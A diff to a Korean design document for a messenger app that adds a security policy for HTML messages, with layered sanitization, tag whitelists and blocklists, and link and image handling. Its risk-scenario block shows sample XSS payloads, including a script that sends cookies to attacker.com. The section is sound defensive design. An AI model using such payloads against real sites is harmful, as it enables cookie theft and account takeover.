@@ -299,7 +299,7 @@ CREATE TABLE messages (
     room_id             TEXT NOT NULL,
     from_user_id        TEXT NOT NULL,
     from_device_id      TEXT NOT NULL,
-    msg_type            TEXT NOT NULL,           -- 'text' / 'image' / 'video' / 'file' / 'system'
+    msg_type            TEXT NOT NULL,           -- 'text' / 'markdown' / 'html' / 'image' / 'video' / 'file' / 'code' / 'system'
     text                TEXT,                    -- 메시지 본문 (텍스트 또는 첨부 캡션)
     has_attachment      INTEGER DEFAULT 0,
     attachment_id       TEXT,                    -- attachments.db 참조
@@ -1155,6 +1155,151 @@ C:\WindowsApp\Noah\
 %LOCALAPPDATA%\Noah_Anmok\
 └── (별개)
 ```
+
+---
+
+## 10.5 HTML 메시지 처리 (보안 정책)
+
+### 배경
+
+Noah는 6가지 메시지 형식을 지원: 텍스트, 마크다운, **HTML**, 코드, 이미지, 첨부 파일.  
+HTML은 가장 강력하지만 가장 위험합니다 (XSS 공격 벡터).
+
+### 위험 시나리오
+
+```html
+<!-- 악의적 메시지 예시 -->
+<script>fetch('https://attacker.com?cookie=' + document.cookie)</script>
+<img src="x" onerror="alert('XSS')">
+<a href="javascript:stealData()">click me</a>
+<iframe src="https://malicious.com"></iframe>
+```
+
+AI 에이전트가 악의적이지 않더라도, **외부 데이터를 그대로 메시지로 변환**할 때 위험.
+
+### 다층 방어
+
+```
+1. 송신 측 (선택적): HTML 기본 검증
+2. 서버 (필수): HTML sanitize 1차 (위험 태그 제거)
+3. 수신 측 (필수): HTML sanitize 2차 (DOMPurify 등)
+4. 렌더링: 격리된 영역에 표시
+5. 외부 리소스: 클릭 시 확인
+```
+
+서버는 메시지를 영구 저장 안 하지만, **큐 임시 저장 시점에서 sanitize**해서 다른 디바이스에 안전한 HTML만 전달.
+
+### 화이트리스트 (허용 태그/속성)
+
+#### 허용
+```
+구조:    p, div, span, br, hr, h1~h6
+강조:    strong, em, u, s, mark, del, ins
+목록:    ul, ol, li
+표:      table, thead, tbody, tr, th, td
+링크:    a (href: http/https만, target=_blank 강제)
+이미지:  img (src: 메시지 첨부만, 외부 도메인 차단)
+코드:    code, pre
+인용:    blockquote
+접기:    details, summary
+```
+
+#### 차단
+```
+태그:    script, iframe, object, embed, form, input, button,
+         meta, link, style, base
+속성:    on* (onclick, onerror, onload, ...)
+URL:     javascript:, data: (이미지 외), vbscript:, file:
+스타일:  expression(), behavior:, -moz-binding
+```
+
+### 구현 라이브러리
+
+| 플랫폼 | 라이브러리 | 검증 상태 |
+|--------|----------|---------|
+| 서버 (Node.js) | **DOMPurify** + jsdom | OWASP 권장 |
+| 모바일 (.NET MAUI) | **HtmlSanitizer** (Ganss) | NuGet, 안정적 |
+| PC (.NET WPF) | **HtmlSanitizer** (동일) | 같은 라이브러리 |
+| AI SDK (Python) | **bleach** | 검증됨 |
+| AI SDK (Node.js) | **DOMPurify** | 동일 |
+
+### 렌더링 전략
+
+#### 모바일 (MAUI)
+- 옵션 1: **HtmlLabel** 컨트롤 (CommunityToolkit.Maui)
+- 옵션 2: WebView 격리 (성능 부담, 복잡한 메시지만)
+- 추천: 옵션 1 + 복잡한 건 옵션 2
+
+#### PC (WPF)
+- 옵션 1: FlowDocument 변환
+- 옵션 2: WebView2 격리
+- 추천: 옵션 1 (간단 HTML), 2 (복잡 HTML)
+
+### 외부 링크 처리
+
+```
+사용자가 메시지 안 링크 클릭
+  ↓
+경고 다이얼로그: "외부 사이트로 이동합니다: https://...
+                계속하시겠습니까?"
+  ↓ [확인]
+시스템 기본 브라우저로 열기 (앱 안에서 열지 않음)
+```
+
+### 외부 이미지 처리
+
+```
+HTML에 <img src="https://attacker.com/track.png">
+  ↓
+기본 동작: 이미지 다운로드 차단 (트래킹 방지)
+표시: "이미지 표시 [클릭]" 버튼
+사용자가 명시적으로 클릭 시만 다운로드 + 표시
+```
+
+### 메시지 형식 권장 우선순위
+
+1. **텍스트** — 가장 안전, 빠름, 모든 메시지의 기본
+2. **마크다운** — 구조화된 메시지, 안전, 충분한 표현력
+3. **HTML (sanitized)** — 마크다운으로 안 되는 경우만
+4. **코드** — 구문 강조 필요한 경우
+5. **이미지** — 시각 자료
+6. **첨부** — 위 5가지로 안 되는 경우
+
+**원칙**: 마크다운으로 가능한 건 마크다운으로. HTML은 마지막 수단.
+
+### 메시지 객체 형식
+
+```json
+{
+  "msg_id": "01HX...",
+  "type": "html",
+  "format_version": 1,
+  "content": "<p>안전한 <strong>HTML</strong></p>",
+  "sanitized": true,
+  "sanitized_at": "server",
+  "sanitizer": "DOMPurify@3.0.5"
+}
+```
+
+서버가 sanitize 결과를 메타에 기록 → 클라이언트가 신뢰 여부 판단.
+
+### 신뢰도 표시 (UI)
+
+```
+일반 메시지 (텍스트/마크다운):
+  [메시지 본문]
+
+HTML 메시지:
+  🔒 [HTML]              ← 작은 배지
+  [메시지 본문]
+  
+외부 링크/이미지 포함:
+  ⚠️ [외부 콘텐츠]
+  [메시지 본문]
+  [이미지 표시 - 클릭]
+```
+
+사용자가 메시지 위험도를 시각적으로 알 수 있음.
 
 ---
 
